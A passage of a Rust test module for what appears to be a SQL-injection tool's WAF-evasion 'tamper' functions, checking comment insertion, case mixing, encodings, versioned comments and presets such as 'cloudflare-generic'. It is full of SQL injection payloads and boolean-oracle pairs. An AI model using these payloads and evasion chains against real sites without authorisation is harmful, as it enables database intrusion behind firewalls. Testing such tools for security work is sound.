        let p = "' OR 1=1 -- -";
        let out = Tamper::Space2Comment.apply(p);
        // trailing `-- -` terminator is preserved: `--/**/-` is not a
        // comment in MySQL and would break the payload server-side.
        // (The body's trailing space still becomes `/**/` — valid SQL,
        // and it also hides the literal ` -- ` from naive WAF signatures.)
        assert_eq!(out, "'/**/OR/**/1=1/**/-- -");
    }

    #[test]
    fn space2comment_preserves_line_comment_terminators() {
        // MySQL `-- -` style
        assert_eq!(
            Tamper::Space2Comment.apply("1 OR 1=1 -- -"),
            "1/**/OR/**/1=1/**/-- -"
        );
        // Postgres/MSSQL/Oracle `--` style
        assert_eq!(
            Tamper::Space2Comment.apply("' OR 1=1 --"),
            "'/**/OR/**/1=1/**/--"
        );
        // `#` style
        assert_eq!(Tamper::Space2Comment.apply("' OR 1=1#"), "'/**/OR/**/1=1#");
        // no terminator: unchanged behaviour
        assert_eq!(Tamper::Space2Comment.apply("a b"), "a/**/b");
    }

    #[test]
    fn randomcomments_preserves_terminator() {
        for _ in 0..20 {
            let out = Tamper::RandomComments.apply("' OR 1=1 -- -");
            assert!(out.ends_with("-- -"), "terminator mangled: {out}");
            assert!(!out.contains("--/**/-"), "broken comment: {out}");
            assert!(out.starts_with('\''), "got {out}");
            assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
        }
    }

    #[test]
    fn split_trailing_comment_edge_cases() {
        assert_eq!(split_trailing_comment("a b"), ("a b", ""));
        assert_eq!(split_trailing_comment("a --"), ("a ", "--"));
        assert_eq!(split_trailing_comment("a -- -"), ("a ", "-- -"));
        assert_eq!(split_trailing_comment("a#b"), ("a", "#b"));
        // `--` inside a string literal without trailing space is not a terminator
        assert_eq!(split_trailing_comment("a--b"), ("a--b", ""));
        // last `--` wins (leading space stays in body, tamper converts it)
        assert_eq!(split_trailing_comment("x--y -- -"), ("x--y ", "-- -"));
    }

    #[test]
    fn space2plus_basic() {
        assert_eq!(Tamper::Space2Plus.apply("a b c"), "a+b+c");
    }

    #[test]
    fn space2tab_basic() {
        assert_eq!(Tamper::Space2Tab.apply("a b"), "a%09b");
    }

    #[test]
    fn randomcase_changes_case() {
        let out = Tamper::RandomCase.apply("select");
        // randomcase should at least contain same letters case-insensitively
        assert_eq!(out.to_ascii_lowercase(), "select");
        // length preserved
        assert_eq!(out.len(), 6);
    }

    #[test]
    fn versioned_wraps_keywords() {
        let out = Tamper::VersionedComment.apply("' OR 1=1 -- -");
        assert!(out.contains("/*!50000OR*/"), "got {out}");
        let out2 = Tamper::VersionedComment.apply("' UNION SELECT 1,2 -- -");
        assert!(out2.contains("/*!50000UNION*/"));
        assert!(out2.contains("/*!50000SELECT*/"));
    }

    #[test]
    fn betweencomment_inserts() {
        let out = Tamper::BetweenComment.apply("SELECT");
        assert_eq!(out, "S/**/E/**/L/**/E/**/C/**/T");
        let out2 = Tamper::BetweenComment.apply("' OR 1=1");
        assert!(out2.contains("O/**/R"));
    }

    #[test]
    fn charencode_encodes_space_and_quote() {
        let out = Tamper::CharEncode.apply("' OR 1=1");
        // ' -> %27, space -> %20, = -> %3d
        assert!(out.contains("%27"), "got {out}");
        assert!(out.contains("%20"));
        assert!(!out.contains(' '));
        assert!(!out.contains('\''));
    }

    #[test]
    fn doubleencode_encodes_percent() {
        let out = Tamper::DoubleEncode.apply("'");
        // ' -> %27 -> %2527 (since % -> %25)
        assert_eq!(out, "%2527");
    }

    #[test]
    fn hexencode_full() {
        let out = Tamper::HexEncode.apply("AB");
        assert_eq!(out, "%41%42");
    }

    #[test]
    fn unicodeencode_full() {
        let out = Tamper::UnicodeEncode.apply("A");
        assert_eq!(out, "%u0041");
    }

    #[test]
    fn overlong_encodes_slash() {
        let out = Tamper::OverlongUtf8.apply("/");
        // / 0x2f -> %c0%af
        assert_eq!(out, "%c0%af");
        let out2 = Tamper::OverlongUtf8.apply("a/b");
        assert!(out2.contains("%c0%af"), "got {out2}");
        assert!(out2.starts_with('a'));
    }

    #[test]
    fn space2dash_replaces_spaces_with_dash_comment() {
        let out = Tamper::Space2Dash.apply("' OR 1=1");
        assert!(!out.contains(' '), "got {out}");
        assert!(out.contains("--"), "got {out}");
        assert!(out.contains("%0A"), "got {out}");
        assert!(out.starts_with('\''));
        assert!(out.ends_with('1'));
    }

    #[test]
    fn randomcomments_replaces_spaces_with_comment_variants() {
        let out = Tamper::RandomComments.apply("' OR 1=1");
        assert!(!out.contains(' '), "got {out}");
        assert!(out.starts_with('\''));
        assert!(out.ends_with('1'));
        // every gap is either /**/ or /**/**/, nothing else was inserted
        assert_eq!(out.replace("/**/**/", "").replace("/**/", ""), "'OR1=1");
    }

    #[test]
    fn base64_roundtrips() {
        use base64::{Engine as _, engine::general_purpose::STANDARD};
        let out = Tamper::Base64Encode.apply("' OR 1=1 -- -");
        assert_eq!(
            STANDARD
                .decode(&out)
                .map(|b| String::from_utf8_lossy(&b).into_owned()),
            Ok("' OR 1=1 -- -".to_owned())
        );
    }

    #[test]
    fn new_tampers_registered_in_from_name_and_all_names() {
        for name in [
            "space2dash",
            "randomcomments",
            "equaltolike",
            "base64encode",
        ] {
            assert!(
                Tamper::all_names().contains(&name),
                "{name} missing from all_names"
            );
            assert!(
                Tamper::from_name(name).is_some(),
                "{name} missing from from_name"
            );
        }
    }

    #[test]
    fn apply_tampers_chain_order() {
        let payload = "a b";
        let tampers = vec![Tamper::Space2Comment, Tamper::RandomCase];
        let chained = apply_tampers(payload, &tampers);
        // first space2comment -> "a/**/b", then randomcase keeps /**/ but mixes letters
        assert!(chained.contains("/**/"), "got {chained}");
        assert_eq!(chained.to_ascii_lowercase(), "a/**/b");
    }

    #[test]
    fn expand_no_tamper_single() {
        let v = expand_with_tampers("payload", &[]);
        assert_eq!(v, vec!["payload"]);
    }

    #[test]
    fn expand_with_two_tampers() {
        let tampers = vec![Tamper::Space2Comment, Tamper::CharEncode];
        let v = expand_with_tampers("' OR 1=1", &tampers);
        // original + each single + chained = 4
        assert_eq!(v.len(), 4);
        assert_eq!(v[0], "' OR 1=1");
        assert!(v[1].contains("/**/"));
        assert!(v[2].contains("%27")); // charencode
        // chained: space2comment then charencode encodes "/" and "*" too
        assert!(v[3].contains("%2f") || v[3].contains("%2F"), "got {}", v[3]);
    }

    #[test]
    fn expand_dedupes_identical() {
        // plus and comment produce different, but if payload has no space, space tampers are no-op
        let tampers = vec![Tamper::Space2Comment, Tamper::Space2Tab];
        let v = expand_with_tampers("nospace", &tampers);
        // original == space2comment == space2tab == chained (all same) -> deduped to 1
        assert_eq!(v.len(), 1);
        assert_eq!(v[0], "nospace");
    }

    #[test]
    fn parse_new_tampers() {
        let v = parse_tamper_list(Some(
            "space2dash,space2mssqlblank,randomcomments,equaltolike,versionedmorekeywords,base64encode",
        ));
        assert_eq!(
            v,
            vec![
                Tamper::Space2Dash,
                Tamper::Space2MssqlBlank,
                Tamper::RandomComments,
                Tamper::EqualToLike,
                Tamper::VersionedMoreKeywords,
                Tamper::Base64Encode,
            ]
        );
    }

    #[test]
    fn parse_new_aliases() {
        assert_eq!(parse_tamper_list(Some("dash")), vec![Tamper::Space2Dash]);
        assert_eq!(
            parse_tamper_list(Some("mssqlblank")),
            vec![Tamper::Space2MssqlBlank]
        );
        assert_eq!(
            parse_tamper_list(Some("equal2like")),
            vec![Tamper::EqualToLike]
        );
        assert_eq!(parse_tamper_list(Some("b64")), vec![Tamper::Base64Encode]);
        assert_eq!(
            parse_tamper_list(Some("morekeywords")),
            vec![Tamper::VersionedMoreKeywords]
        );
    }

    #[test]
    fn all_names_covers_new_tampers() {
        for name in [
            "space2dash",
            "space2mssqlblank",
            "randomcomments",
            "equaltolike",
            "versionedmorekeywords",
            "base64encode",
        ] {
            assert!(
                Tamper::all_names().contains(&name),
                "all_names missing {name}"
            );
            assert!(Tamper::from_name(name).is_some());
        }
        assert_eq!(Tamper::all_names().len(), 24);
    }

    #[test]
    fn space2dash_basic() {
        assert_eq!(Tamper::Space2Dash.apply("a b"), "a--%0Ab");
        let out = Tamper::Space2Dash.apply("' OR 1=1 -- -");
        assert!(!out.contains(' '), "got {out}");
        assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
    }

    #[test]
    fn space2mssqlblank_uses_mssql_range() {
        for _ in 0..20 {
            let out = Tamper::Space2MssqlBlank.apply("a b");
            assert!(!out.contains(' '), "got {out}");
            assert!(
                [
                    "a%09b", "a%0Ab", "a%0ab", "a%0Bb", "a%0bb", "a%0Cb", "a%0cb", "a%0Db", "a%0db"
                ]
                .contains(&out.as_str()),
                "unexpected blank: {out}"
            );
        }
    }

    #[test]
    fn randomcomments_no_space_left() {
        for _ in 0..20 {
            let out = Tamper::RandomComments.apply("' OR 1=1");
            assert!(!out.contains(' '), "got {out}");
            assert!(out.contains("/**/"), "got {out}");
            assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
        }
    }

    #[test]
    fn equaltolike_basic() {
        assert_eq!(
            Tamper::EqualToLike.apply("' OR 1=1 -- -"),
            "' OR 1 LIKE 1 -- -"
        );
        assert_eq!(
            Tamper::EqualToLike.apply("' OR 1=2 -- -"),
            "' OR 1 LIKE 2 -- -"
        );
    }

    #[test]
    fn equaltolike_preserves_comparison_operators() {
        assert_eq!(
            Tamper::EqualToLike.apply("' AND LENGTH((SELECT @@version))>=5 -- -"),
            "' AND LENGTH((SELECT @@version))>=5 -- -"
        );
        assert_eq!(Tamper::EqualToLike.apply("a<=b"), "a<=b");
        assert_eq!(Tamper::EqualToLike.apply("a!=b"), "a!=b");
        assert_eq!(Tamper::EqualToLike.apply("a==b"), "a==b");
    }

    #[test]
    fn versionedmorekeywords_wraps_extended_set() {
        let out = Tamper::VersionedMoreKeywords.apply("' UNION SELECT 1,2 -- -");
        assert!(out.contains("/*!50000UNION*/"), "got {out}");
        assert!(out.contains("/*!50000SELECT*/"), "got {out}");
        // extended keywords untouched by the base versionedcomment tamper
        let more = Tamper::VersionedMoreKeywords.apply("SELECT CASE WHEN 1=1 ELSE 2 END");
        assert!(more.contains("/*!50000CASE*/"), "got {more}");
        assert!(more.contains("/*!50000WHEN*/"), "got {more}");
        let base = Tamper::VersionedComment.apply("SELECT CASE WHEN 1=1 ELSE 2 END");
        assert!(
            !base.contains("/*!50000CASE*/"),
            "base must not wrap CASE: {base}"
        );
    }

    #[test]
    fn base64encode_roundtrips() {
        let payload = "' OR 1=1 -- -";
        let out = Tamper::Base64Encode.apply(payload);
        assert_eq!(out, "JyBPUiAxPTEgLS0gLQ==");
        assert!(!Tamper::Base64Encode.is_boolean_safe());
    }

    #[test]
    fn other_tampers_are_boolean_safe() {
        for name in Tamper::all_names() {
            let t = Tamper::from_name(name).unwrap_or_else(|| panic!("known {name}"));
            if t == Tamper::Base64Encode || t == Tamper::JsonUnicodeEscape {
                continue;
            }
            assert!(t.is_boolean_safe(), "{name} should be boolean-safe");
        }
    }

    #[test]
    fn boolean_safe_sets_drop_base64() {
        let tampers = vec![Tamper::Space2Comment, Tamper::Base64Encode];
        let sets = boolean_safe_transformation_sets(&tampers);
        // base64 excluded: [] + [space2comment] + chained([space2comment]) deduped
        assert_eq!(sets.len(), 2);
        assert_eq!(sets[0], Vec::<Tamper>::new());
        assert_eq!(sets[1], vec![Tamper::Space2Comment]);
        for s in &sets {
            assert!(!s.contains(&Tamper::Base64Encode));
        }
    }

    #[test]
    fn boolean_safe_sets_drop_json_unicode_escape() {
        // I1: `JsonUnicodeEscape` escapes the injection quote itself, so both
        // branches go inert — it must be filtered like `Base64Encode`.
        assert!(!Tamper::JsonUnicodeEscape.is_boolean_safe());
        let tampers = vec![Tamper::Space2Comment, Tamper::JsonUnicodeEscape];
        let sets = boolean_safe_transformation_sets(&tampers);
        assert_eq!(sets.len(), 2);
        assert_eq!(sets[0], Vec::<Tamper>::new());
        assert_eq!(sets[1], vec![Tamper::Space2Comment]);
        for s in &sets {
            assert!(!s.contains(&Tamper::JsonUnicodeEscape));
        }
    }

    #[test]
    fn boolean_safe_sets_only_base64_keeps_original() {
        let sets = boolean_safe_transformation_sets(&[Tamper::Base64Encode]);
        assert_eq!(sets, vec![Vec::<Tamper>::new()]);
    }

    #[test]
    fn boolean_safe_sets_passthrough_without_base64() {
        let tampers = vec![Tamper::Space2Comment, Tamper::EqualToLike];
        assert_eq!(
            boolean_safe_transformation_sets(&tampers),
            tamper_transformation_sets(&tampers)
        );
        assert_eq!(
            boolean_safe_transformation_sets(&[]),
            vec![Vec::<Tamper>::new()]
        );
    }

    #[test]
    fn new_space_tampers_expand_bounded() {
        let tampers = vec![
            Tamper::Space2Dash,
            Tamper::Space2MssqlBlank,
            Tamper::RandomComments,
            Tamper::EqualToLike,
        ];
        let v = expand_with_tampers("' OR 1=1 -- -", &tampers);
        assert_eq!(v.len(), tampers.len() + 2);
        let sets = tamper_transformation_sets(&tampers);
        assert_eq!(sets.len(), tampers.len() + 2);
        let safe = boolean_safe_transformation_sets(&tampers);
        assert_eq!(safe.len(), tampers.len() + 2);
    }

    #[test]
    fn seeded_tamper_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let payload = "' OR SELECT * FROM users WHERE name = 'admin' -- -";
        let tampers = vec![
            Tamper::RandomCase,
            Tamper::Space2RandomBlank,
            Tamper::RandomComments,
            Tamper::Space2MssqlBlank,
        ];
        let mut a = make_rng(Some(7));
        let mut b = make_rng(Some(7));
        assert_eq!(
            apply_tampers_with_rng(payload, &tampers, &mut a),
            apply_tampers_with_rng(payload, &tampers, &mut b)
        );
        // Fresh RNG from the same seed replays the same output.
        let mut c = make_rng(Some(7));
        let mut d = make_rng(Some(7));
        assert_eq!(
            expand_with_tampers_with_rng(payload, &tampers, &mut c),
            expand_with_tampers_with_rng(payload, &tampers, &mut d)
        );
    }

    #[test]
    fn seeded_tamper_different_seeds_likely_differ() {
        use crate::seeded_rng::make_rng;
        // Long alphabetic payload: randomcase has 2^N outcomes, collision
        // across seeds is negligible.
        let payload = "SELECT * FROM users WHERE name = 'administrator'";
        let tampers = vec![Tamper::RandomCase];
        let mut a = make_rng(Some(1));
        let mut b = make_rng(Some(2));
        assert_ne!(
            apply_tampers_with_rng(payload, &tampers, &mut a),
            apply_tampers_with_rng(payload, &tampers, &mut b)
        );
    }

    #[test]
    fn unseeded_tamper_path_works() {
        use crate::seeded_rng::make_rng;
        let mut rng = make_rng(None);
        let out = Tamper::RandomCase.apply_with_rng("select", &mut rng);
        assert_eq!(out.to_ascii_lowercase(), "select");
        assert_eq!(out.len(), 6);
    }

    #[test]
    fn boolean_safe_tampers_preserve_true_false_differential() {
        use crate::seeded_rng::make_rng;
        // Garde-fou contre futur ZWSP / split intra-mot qui effondrerait
        // l'oracle : TRUE et FALSE doivent rester distincts après tamper.
        let pairs = [
            ("' OR 1=1 -- -", "' OR 1=2 -- -"),
            ("' OR 'a'='a' -- -", "' OR 'a'='b' -- -"),
        ];
        for name in Tamper::all_names() {
            let t = Tamper::from_name(name).expect("known tamper");
            if !t.is_boolean_safe() {
                continue;
            }
            let mut rng = make_rng(Some(42));
            for (true_p, false_p) in &pairs {
                let a = t.apply_with_rng(true_p, &mut rng);
                let b = t.apply_with_rng(false_p, &mut rng);
                assert_ne!(a, b, "{name} collapsed differential for {true_p}");
            }
        }
    }

    #[test]
    fn double_encode_degrades_trailing_comment_needs_double_decode() {
        // Documente l'exigence double-décodage serveur : après simple
        // décodage, `-- -` ne revient pas (reste `%20`), donc le terminateur
        // casse sans 2e passe. Verrouille la non-régression.
        let out = Tamper::DoubleEncode.apply("' OR 1=1 -- -");
        assert!(out.contains("%2520"), "got {out}");
        assert!(!out.contains(' '), "got {out}");
    }

    #[test]
    fn versioned_more_is_superset_of_versioned() {
        let payload = "' UNION SELECT 1,2 -- -";
        let base = Tamper::VersionedComment.apply(payload);
        let more = Tamper::VersionedMoreKeywords.apply(payload);
        assert!(base.contains("/*!50000UNION*/"), "got {base}");
        assert!(more.contains("/*!50000UNION*/"), "got {more}");
        // `CASE/WHEN` wrappé uniquement par more (disjoint MORE_KEYWORDS).
        let extended = "SELECT CASE WHEN 1=1 ELSE 2 END";
        assert!(
            !Tamper::VersionedComment
                .apply(extended)
                .contains("/*!50000CASE*/")
        );
        assert!(
            Tamper::VersionedMoreKeywords
                .apply(extended)
                .contains("/*!50000CASE*/")
        );
    }

    #[test]
    fn space2newline_only_replaces_inter_token_spaces() {
        // `U\nNION` intra-mot ne doit jamais être produit : seuls les `' '`
        // inter-tokens sont remplacés, pas de split dans le mot-clé.
        let out = Tamper::Space2Newline.apply("UNION");
        assert_eq!(out, "UNION");
        let spaced = Tamper::Space2Newline.apply("' UNION SELECT 1 -- -");
        assert!(!spaced.contains(' '), "got {spaced}");
        assert!(spaced.contains("%0a"), "got {spaced}");
    }

    // ── Phase 1 P0 tampers ──────────────────────────────────────────

    #[test]
    fn p0_tampers_registered_with_aliases() {
        for name in [
            "space2paren",
            "versionedfuzz",
            "jsonunicodeescape",
            "numericobfuscate",
            "linecomment",
        ] {
            assert!(
                Tamper::all_names().contains(&name),
                "all_names missing {name}"
            );
            assert!(Tamper::from_name(name).is_some());
        }
        assert_eq!(Tamper::from_name("paren"), Some(Tamper::Space2Paren));
        assert_eq!(
            Tamper::from_name("equalobfuscate"),
            Some(Tamper::NumericObfuscate)
        );
        assert_eq!(Tamper::from_name("numeric"), Some(Tamper::NumericObfuscate));
        assert_eq!(
            Tamper::from_name("jsonunicode"),
            Some(Tamper::JsonUnicodeEscape)
        );
        assert_eq!(Tamper::from_name("commentfuzz"), Some(Tamper::LineComment));
        // I1: `JsonUnicodeEscape` (like `Base64Encode`) is NOT boolean-safe:
        // it escapes the injection quote itself, both branches go inert.
        assert!(!Tamper::Base64Encode.is_boolean_safe());
        assert!(!Tamper::JsonUnicodeEscape.is_boolean_safe());
        for name in Tamper::all_names() {
            let t = Tamper::from_name(name).expect("known tamper");
            if t == Tamper::Base64Encode || t == Tamper::JsonUnicodeEscape {
                continue;
            }
            assert!(t.is_boolean_safe(), "{name} should be boolean-safe");
        }
    }

    #[test]
    fn space2paren_matches_or_paren_style() {
        assert_eq!(Tamper::Space2Paren.apply("' OR 1=1"), "'OR(1=1)");
        assert_eq!(Tamper::Space2Paren.apply("' OR 1=1 -- -"), "'OR(1=1)-- -");
        assert_eq!(Tamper::Space2Paren.apply("1 AND 1=1"), "1AND(1=1)");
        // no space left in the body part, terminator preserved verbatim
        let out = Tamper::Space2Paren.apply("' OR 'a'='a' -- -");
        assert!(out.ends_with("-- -"), "got {out}");
        let body = out.split("--").next().unwrap_or("");
        assert!(!body.contains(' '), "space left in body: {out}");
        assert!(out.contains("'OR'"), "got {out}");
        // balanced parens
        assert_eq!(out.chars().filter(|&c| c == '(').count(), 0, "got {out}");
        // payload without spaces is a no-op
        assert_eq!(Tamper::Space2Paren.apply("nospace"), "nospace");
    }

    #[test]
    fn space2paren_balances_inserted_parens() {
        let out = Tamper::Space2Paren.apply("' OR 1=1");
        assert_eq!(
            out.chars().filter(|&c| c == '(').count(),
            out.chars().filter(|&c| c == ')').count()
        );
        let out2 = Tamper::Space2Paren.apply("1 AND 1=1 -- -");
        assert!(out2.ends_with("-- -"), "got {out2}");
        let body2 = out2.split("--").next().unwrap_or("");
        assert!(!body2.contains(' '), "got {out2}");
    }

    #[test]
    fn space2paren_deterministic_across_seeds() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(1));
        let mut b = make_rng(Some(999));
        assert_eq!(
            Tamper::Space2Paren.apply_with_rng("' OR 1=1 -- -", &mut a),
            Tamper::Space2Paren.apply_with_rng("' OR 1=1 -- -", &mut b)
        );
    }

    #[test]
    fn versionedfuzz_wraps_with_seeded_version() {
        use crate::seeded_rng::make_rng;
        let mut rng = make_rng(Some(42));
        let out = Tamper::VersionedFuzz.apply_with_rng("' OR 1=1 -- -", &mut rng);
        assert!(out.contains("/*!") || out.contains("/**!"), "got {out}");
        assert!(out.contains("*/"), "got {out}");
        assert!(
            ["0", "32302", "50000", "80000", "99999"]
                .iter()
                .any(|v| out.contains(v)),
            "seeded version missing: {out}"
        );
        assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
    }

    #[test]
    fn versionedfuzz_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let payload = "' UNION SELECT 1,2 -- -";
        let mut a = make_rng(Some(7));
        let mut b = make_rng(Some(7));
        assert_eq!(
            Tamper::VersionedFuzz.apply_with_rng(payload, &mut a),
            Tamper::VersionedFuzz.apply_with_rng(payload, &mut b)
        );
    }

    #[test]
    fn versionedfuzz_seeds_cover_multiple_versions() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let payload = "' UNION SELECT * FROM users -- -";
        let mut distinct = HashSet::new();
        for seed in 1..=12 {
            let mut rng = make_rng(Some(seed));
            distinct.insert(Tamper::VersionedFuzz.apply_with_rng(payload, &mut rng));
        }
        assert!(
            distinct.len() >= 2,
            "seeded fuzz should vary versions/openers across seeds"
        );
    }

    #[test]
    fn jsonunicodeescape_replaces_waf_visible_chars() {
        let out = Tamper::JsonUnicodeEscape.apply("' OR 1=1 -- -");
        assert!(out.ends_with("-- -"), "terminator preserved: {out}");
        let body = out.split("--").next().unwrap_or("");
        assert!(!body.contains('\''), "got {out}");
        assert!(!body.contains('"'), "got {out}");
        assert!(!body.contains(' '), "got {out}");
        assert!(!body.contains('/'), "got {out}");
        assert!(out.contains("\\u0027"), "got {out}");
        assert!(out.contains("\\u0020"), "got {out}");
        assert!(out.contains("1=1"), "digits survive: {out}");
        // slash escaping
        let slash = Tamper::JsonUnicodeEscape.apply("a/b");
        assert_eq!(slash, "a\\u002fb");
        // roundtrip: decoding restores the body
        let decoded = body
            .replace("\\u0022", "\"")
            .replace("\\u0027", "'")
            .replace("\\u0020", " ")
            .replace("\\u002f", "/");
        assert_eq!(decoded, "' OR 1=1 ");
    }

    #[test]
    fn jsonunicodeescape_deterministic_across_seeds() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(1));
        let mut b = make_rng(Some(2));
        assert_eq!(
            Tamper::JsonUnicodeEscape.apply_with_rng("' OR 'a'='a' -- -", &mut a),
            Tamper::JsonUnicodeEscape.apply_with_rng("' OR 'a'='a' -- -", &mut b)
        );
    }

    #[test]
    fn numericobfuscate_emits_seeded_styles() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let mut styles = HashSet::new();
        for seed in 1..=20 {
            let mut rng = make_rng(Some(seed));
            let out = Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut rng);
            assert!(out.ends_with("-- -"), "terminator preserved: {out}");
            assert!(!out.contains(" 1=1 "), "bare digits must go: {out}");
            if out.contains("1e0=1e0") {
                styles.insert("e0");
            } else if out.contains("0x31=0x31") {
                styles.insert("hex");
            } else {
                panic!("unexpected numeric style: {out}");
            }
        }
        assert_eq!(styles.len(), 2, "both e0 and hex styles must occur");
    }

    #[test]
    fn numericobfuscate_false_branch_coherent() {
        use crate::seeded_rng::make_rng;
        for seed in [1, 2, 3, 42] {
            let mut rng = make_rng(Some(seed));
            let f = Tamper::NumericObfuscate.apply_with_rng("' OR 1=2 -- -", &mut rng);
            assert!(
                f.contains("1e0=2e0") || f.contains("0x31=0x32"),
                "FALSE coherence broken: {f}"
            );
        }
    }

    #[test]
    fn numericobfuscate_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(11));
        let mut b = make_rng(Some(11));
        assert_eq!(
            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut a),
            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut b)
        );
    }

    #[test]
    fn numericobfuscate_preserves_char_chr_and_zero_coherence() {
        use crate::seeded_rng::make_rng;
        // Crossed I1: `CHAR(97)`/`CHR(97)` function oracles × `NumericObfuscate`.
        // The `97` inside `CHAR(...)/CHR(...)` must survive (`CHAR(0x3937)`
        // drifts from `'a'`), `0` must stay `0` (`DIV 0 → NULL`, `XOR 0` falsy).
        // TRUE stays `X=X`, FALSE stays `X=Y` with `X != Y`, per branch.
        let pairs = [
            ("' OR CHAR(97)=CHAR(97) -- -", "' OR CHAR(97)=CHAR(98) -- -"),
            ("' OR CHR(97)=CHR(97) -- -", "' OR CHR(97)=CHR(98) -- -"),
            ("' OR 1 DIV 1 -- -", "' OR 1 DIV 0 -- -"),
            ("' OR 1 XOR 0 -- -", "' OR 1 XOR 1 -- -"),
        ];
        for seed in [1, 2, 3, 7, 42] {
            for (true_p, false_p) in &pairs {
                let mut rng = make_rng(Some(seed));
                let a = Tamper::NumericObfuscate.apply_with_rng(true_p, &mut rng);
                let mut rng = make_rng(Some(seed));
                let b = Tamper::NumericObfuscate.apply_with_rng(false_p, &mut rng);
                assert_ne!(a, b, "seed {seed} collapsed differential for {true_p}");
                for out in [&a, &b] {
                    assert!(out.ends_with("-- -"), "terminator preserved: {out}");
                }
                if true_p.contains("CHAR(") || true_p.contains("CHR(") {
                    assert!(
                        a.contains("CHAR(97)=CHAR(97)") || a.contains("CHR(97)=CHR(97)"),
                        "CHAR/CHR args must survive obfuscation: {a}"
                    );
                    assert!(
                        b.contains("CHAR(97)=CHAR(98)") || b.contains("CHR(97)=CHR(98)"),
                        "CHAR/CHR FALSE must stay X=Y with X!=Y: {b}"
                    );
                    assert!(
                        !a.contains("0x3937") && !a.contains("97e0"),
                        "97 inside CHAR/CHR must not be rewritten: {a}"
                    );
                }
                if true_p.contains("DIV") {
                    assert!(
                        b.contains("DIV 0"),
                        "DIV-by-zero NULL oracle must keep bare 0: {b}"
                    );
                }
                if true_p.contains("XOR 0") {
                    assert!(
                        a.contains("XOR 0") || a.contains("XOR 0x30"),
                        "XOR TRUE must keep falsy 0: {a}"
                    );
                }
            }
        }
        // Lowercase / spaced variants are protected too.
        let mut rng = make_rng(Some(9));
        let out =
            Tamper::NumericObfuscate.apply_with_rng("' OR char (97)=char (97) -- -", &mut rng);
        assert!(out.contains("char (97)=char (97)"), "got {out}");
    }

    #[test]
    fn linecomment_swaps_terminator_seeded() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let mut seen = HashSet::new();
        for seed in 1..=12 {
            let mut rng = make_rng(Some(seed));
            let out = Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut rng);
            assert!(out.contains("1=1"), "body preserved: {out}");
            assert!(!out.contains("-- -"), "old terminator must go: {out}");
            let tail_ok = out.ends_with("--+") || out.ends_with("%23") || out.ends_with(";/*");
            assert!(tail_ok, "unexpected terminator: {out}");
            seen.insert(out[out.len().saturating_sub(3)..].to_owned());
        }
        assert!(seen.len() >= 2, "seeded variants should vary: {seen:?}");
    }

    #[test]
    fn linecomment_no_tail_is_noop() {
        // No trailing comment: nothing to swap, payload untouched.
        assert_eq!(Tamper::LineComment.apply("nospace"), "nospace");
        assert_eq!(Tamper::LineComment.apply("' OR 1=1"), "' OR 1=1");
    }

    #[test]
    fn linecomment_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(5));
        let mut b = make_rng(Some(5));
        assert_eq!(
            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut a),
            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut b)
        );
    }

    #[test]
    fn p0_tampers_preserve_true_false_differential() {
        use crate::seeded_rng::make_rng;
        let pairs = [
            ("' OR 1=1 -- -", "' OR 1=2 -- -"),
            ("' OR 'a'='a' -- -", "' OR 'a'='b' -- -"),
        ];
        // I1: `JsonUnicodeEscape` excluded — string-level `a != b` still holds
        // but both branches are semantically inert (quotes escaped), so it is
        // NOT boolean-safe and must not be asserted as such here.
        let tampers = [
            Tamper::Space2Paren,
            Tamper::VersionedFuzz,
            Tamper::NumericObfuscate,
            Tamper::LineComment,
        ];
        for t in &tampers {
            assert!(t.is_boolean_safe(), "{t:?} must be boolean-safe");
            let mut rng = make_rng(Some(42));
            for (true_p, false_p) in &pairs {
                let a = t.apply_with_rng(true_p, &mut rng);
                let b = t.apply_with_rng(false_p, &mut rng);
                assert_ne!(a, b, "{t:?} collapsed differential for {true_p}");
            }
        }
    }

    #[test]
    fn jsonunicodeescape_is_not_boolean_safe_despite_string_difference() {
        // I1 regression: `a != b` as strings is NOT enough — the escaped quotes
        // make both branches equally inert server-side (no quote to close).
        use crate::seeded_rng::make_rng;
        assert!(!Tamper::JsonUnicodeEscape.is_boolean_safe());
        let mut rng = make_rng(Some(42));
        let a = Tamper::JsonUnicodeEscape.apply_with_rng("' OR 1=1 -- -", &mut rng);
        let b = Tamper::JsonUnicodeEscape.apply_with_rng("' OR 1=2 -- -", &mut rng);
        // Strings differ (digits untouched) yet both are inert: no raw `'`
        // left in the body to break out of the string context.
        assert_ne!(a, b);
        for out in [&a, &b] {
            let body = out.split("--").next().unwrap_or("");
            assert!(
                !body.contains('\''),
                "inert payload must not keep a raw quote: {out}"
            );
        }
        // And the safe-sets filter really drops it.
        let sets =
            boolean_safe_transformation_sets(&[Tamper::Space2Comment, Tamper::JsonUnicodeEscape]);
        for s in &sets {
            assert!(!s.contains(&Tamper::JsonUnicodeEscape));
        }
    }

    #[test]
    fn preset_cloudflare_generic_expands() {
        assert_eq!(
            parse_tamper_list(Some("cloudflare-generic")),
            vec![
                Tamper::RandomCase,
                Tamper::Space2Comment,
                Tamper::VersionedMoreKeywords,
            ]
        );
        // case-insensitive, composes with other names
        assert_eq!(
            parse_tamper_list(Some("CloudFlare-Generic, hexencode")),
            vec![
                Tamper::RandomCase,
                Tamper::Space2Comment,
                Tamper::VersionedMoreKeywords,
                Tamper::HexEncode,
            ]
        );
    }

    #[test]
    fn preset_aggressive_expands() {
        assert_eq!(
            parse_tamper_list(Some("aggressive")),
            vec![
                Tamper::RandomCase,
                Tamper::Space2Paren,
